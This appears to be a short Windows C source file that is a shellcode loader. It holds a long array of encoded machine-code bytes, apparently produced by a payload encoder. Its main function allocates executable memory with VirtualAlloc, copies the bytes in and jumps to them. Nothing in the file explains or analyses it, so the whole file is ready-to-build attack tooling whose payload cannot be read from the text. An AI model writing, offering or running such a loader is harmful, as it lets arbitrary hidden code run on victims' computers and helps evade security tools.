/*


*/
#include "windows.h"
#include "stdio.h"
unsigned char buf[] =
"\xda\xd2\xbe\x88\xfb\xc2\x01\xd9\x74\x24\xf4\x5f\x33\xc9"
"\xb1\xed\x31\x77\x17\x03\x77\x17\x83\x67\x07\x20\xf4\xcd"
"\x59\x37\xd3\xb8\x41\xef\xc5\xce\x51\xe4\xa8\x05\x53\xb5"
"\xb3\x68\x35\xa5\x38\xdc\xaa\x4a\xf8\x45\xbc\x9d\x57\xe9"
"\xf4\x6f\xad\x7c\x09\xcf\xcc\x0b\x92\xe8\x8f\x4f\x4f\x91"
"\x19\x79\x9a\xf7\x57\xb6\x4b\xaa\x0c\x0a\x18\xc3\xeb\x10"
"\xe7\x7c\x65\xe3\x3d\x83\x76\x1d\x6f\xe5\x17\x51\xfb\xf9"
"\xa4\x6e\x0f\xf6\x31\xd3\x61\xf8\x07\x32\x48\xfd\x99\xc6"
"\xab\x73\x5e\xd5\x74\x3b\xc4\x7c\x1e\xe3\xf5\x50\x77\x42"
"\xc9\x1d\x59\x12\x0b\xaa\xcb\x7d\x83\x5c\x45\x14\x26\xf0"
"\xb3\x4a\xa9\x13\xbc\xbd\x3d\x2b\x45\xc6\x2c\x24\x0c\x72"
"\xbb\x75\x8e\xbd\x2f\xda\x8f\xa7\x88\x42\xa7\xd0\x43\x35"
"\x35\x8c\xa8\xb5\x6f\x4b\x4a\xc8\xeb\xa5\x03\xdb\xf2\x78"
"\xf2\x5a\x8c\x59\x02\xaf\x72\x9a\xac\xa5\x05\x4c\x27\x39"
"\x9f\x8d\xe2\xd8\x28\x9d\x3f\xaf\x43\x33\x56\x97\x1a\x3d"
"\xf0\xaa\xbc\xb7\x04\x3c\x29\x79\x29\xb3\xb9\xd4\x14\x44"
"\x91\x0e\xb0\x13\x5a\x30\xf9\x0d\xce\xee\x5e\x84\xe2\x3a"
"\x32\x2c\xcb\x3a\x2a\x05\xa3\x4a\x61\x9b\xfa\x77\xb9\x04"
"\x14\x2e\x67\x10\x6c\xc5\xf9\x00\x59\xfa\x4e\xd1\x23\x57"
"\x2b\x26\xaa\x11\x4b\xb1\x47\x25\x46\x23\x4f\xe8\x4d\x73"
"\x88\x62\xf2\x15\xa1\x76\xc1\x58\xd2\x02\x97\x0d\xe0\x14"
"\x20\xc0\xae\x85\xca\xb1\x22\x27\xb3\xd6\xdc\x27\x9b\xb2"
"\x96\xda\x21\x7a\x08\x88\xe7\xc2\xf6\xea\x99\x88\xa8\xfb"
"\x1a\x4b\xcf\x70\xd4\x6f\xad\xea\xc4\x8d\x44\x88\xef\x32"
"\xc1\x02\xd0\x49\xde\x2a\x5e\x8f\xf4\x94\x50\xf5\x5c\xc1"
"\x01\x81\x51\x90\xec\x96\x44\x90\xe9\x16\xa6\xdd\x41\xa7"
"\x01\xa9\x79\x34\x3f\x42\x36\x26\x05\xb8\xe2\x55\x40\x57"
"\x5c\x82\x67\x16\xb4\x0b\x53\x6c\xc7\x89\x0c\xa0\x01\xa8"
"\x6d\xd3\x2b\x77\xfc\x7a\x01\x39\xd4\x31\xa0\xc0\xc0\xd7"
"\x5f\x65\xf9\x9b\xdb\xe9\x49\x62\x05\x91\xa6\x2c\x6c\x8d"
"\x85\x78\x2e\xad\xe1\x9d\xb9\xcd\x3e\xc4\xc9\xf5\xcd\x59"
"\x1f\x43\xa7\xdb\xf0\xdc\xc8\x24\x56\x45\x6c\x45\x6e\xab"
"\x46\xa2\x47\x41\xa8\x00\xa2\x69\xd0\xe2\xf1\xdb\x60\xd0"
"\xfc\x13\x46\x3e\x86\x55\xbc\x17\xe5\x8f\x4c\xba\x42\x89"
"\xa0\xc8\xd4\x11\xf4\xaa\x75\xb4\x4a\x83\xdb\x9f\x45\xad"
"\x4a\x7c\x8c\x9b\x1f\x22\x49\x49\x0f\xd2\x70\xaf\xa3\x77"
"\xde\xc5\x5b\x55\x7c\xf1\x31\xd1\xe5\xff\xb3\x67\x12\x3b"
"\x1b\xf6\x32\x2a\x20\x81\xbf\x84\x57\xbc\x4f\x3d\x65\x1a"
"\x15\xf0\x69\x17\xa0\xf9\xc3\xdf\x9b\x7d\x98\xe8\x72\x58"
"\x19\x0c\xe7\x40\xa6\xfc\x27\xf2\x7b\xd4\x1d\x37\x8f\x49"
"\x5f\x5f\xca\x02\xfe\xd8\x63\xe2\x64\xab\x8e\x11\x46\x5f"
"\x3f\x8d\xe8\x06\x80\x13\x2e\xa9\x63\x82\xb0\x9d\xa7\xbf"
"\xdc\x07\x79\xb7\xea\x6c\x08\x24\xf3\xbe\x74\x9e\xec\xe9"
"\x6d\x3d\xa6\x6d\x83\xd7\xda\x5f\x4e\x29\x36\xba\x86\x28"
"\x52\xa0\x0f\xdb\xf0\xff\x8a\x5e\x31\x9c\x77\x73\x8d\x49"
"\x59\x97\x70\x9c\xae\x83\xfd\x29\x78\x4d\x6d\x2f\x2a\xb6"
"\x89\xa7\xe7\x1d\x90\x7f\xca\xec\xd6\x7d\xc0\x2c\x5a\x7f"
"\x2c\x9c\xb5\x95\x12\x6f\x3f\x58\x03\x48\x5e\xda\x74\x73"
"\xaa\x99\x24\xdd\x24\x9c\xa1\xb0\x08\x4d\x79\x02\x70\x39"
"\x67\xaf\xde\x83\xce\x34\xb4\x77\xe7\xb6\x71\x1e\x38\x73"
"\x65\x29\xe7\x0e\xc8\xf7\x56\x3a\x5d\xab\xb9\xb0\xf7\x7a"
"\xbc\x75\x18\x86\x46\x7f\x45\x4c\x02\x54\x32\xae\xf7\x70"
"\xdc\xf6\x98\x8f\x5e\xce\x60\x94\xe6\xa8\xb1\x1e\xc5\xcd"
"\x52\xe2\xba\x4a\x56\x0d\x35\xa6\xba\xea\x1b\x25\xd1\x4c"
"\x8a\x97\xcf\x80\x38\xb7\x90\x4d\xb1\x51\x09\xe0\x8e\xfb"
"\xe4\x8e\x5e\xa9\xf5\x47\xa3\xb5\x7d\x25\x26\x3d\xe0\xb9"
"\xf8\x67\x26\xf7\x64\x4d\xa2\xed\x73\x49\x9c\xad\x2a\xac"
"\xe3\x88\x89\x57\xb6\x1a\xa5\xd9\x2c\xed\xc0\xb0\x73\x4b"
"\xc7\xce\x13\xc0\x68\x13\x7e\x9e\x89\xc4\x32\xa6\xd3\x5e"
"\x6c\x34\x67\x21\x82\xf1\xa2\x60\x64\x04\x3e\x37\xa9\x14"
"\xd2\x04\x10\x03\xa9\x66\xaa\x03\x64\xff\x5f\x81\x58\x86"
"\xb1\x27\xa2\xfb\x17\xc3\xb2\x4c\x4b\xc4\x41\x7b\xdd\xc7"
"\x2f\xca\xe9\x8f\xa8\x76\x6c\x22\xaf\x97\xdc\xbb\x2a\x50"
"\x98\xd8\xee\xe5\xa0\x90\x82\x8d\x4b\x68\x2b\x55\x87\x3a"
"\x72\xc4\x79\x00\x5f\x14\x27\x0f\x69\x12\xd5\x62\x8b\x57"
"\x24\xe8\xc2\xc7\xf7\xe5\xa8\x58\x30\x8a\xde\x82\x24\xd4"
"\x6a\xac\x93\x6f\x4c\x7b\x74\x7c\x48\x68\x07\x03\x4b\x6b"
"\xd2\xaf\x31\x88\xde\x46\xa5\x78\x6f\x96\x4e\xbb\x60\x50"
"\x16\x5b\x77\x99\x7b\x73\x1f\x89\x6e\x73\x89\xc6\x2b\x4a"
"\xd5\xb7\xb3\xdf\x7c";
void main()
{
	LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, buf, sizeof(buf));
	((void(*)())Memory)();
}